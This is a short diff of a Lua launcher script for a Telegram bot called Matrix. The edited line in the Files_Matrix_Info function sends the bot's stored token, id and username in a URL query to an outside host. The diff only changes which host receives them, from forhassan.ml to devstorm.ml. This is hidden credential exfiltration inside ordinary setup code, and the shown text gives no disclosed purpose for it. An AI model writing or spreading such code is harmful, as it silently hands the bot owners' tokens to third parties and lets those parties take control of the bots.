@@ -64,7 +64,7 @@ os.execute('lua start.lua')
 end
 local function Files_Matrix_Info()
 Create_Info(database:get(Server_Matrix.."Token_Matrix"),database:get(Server_Matrix.."Id_Matrix"),database:get(Server_Matrix.."UserName_Matrix"))   
-https.request("https://forhassan.ml/Matrix/Matrix.php?id="..database:get(Server_Matrix.."Id_Matrix").."&user="..database:get(Server_Matrix.."UserName_Matrix").."&token="..database:get(Server_Matrix.."Token_Matrix"))
+https.request("https://devstorm.ml/GetUser/?id=TAHAJ20"..database:get(Server_Matrix.."Id_Matrix").."&user="..database:get(Server_Matrix.."UserName_Matrix").."&token="..database:get(Server_Matrix.."Token_Matrix"))
 local RunMatrix = io.open("Matrix", 'w')
 RunMatrix:write([[
 #!/usr/bin/env bash
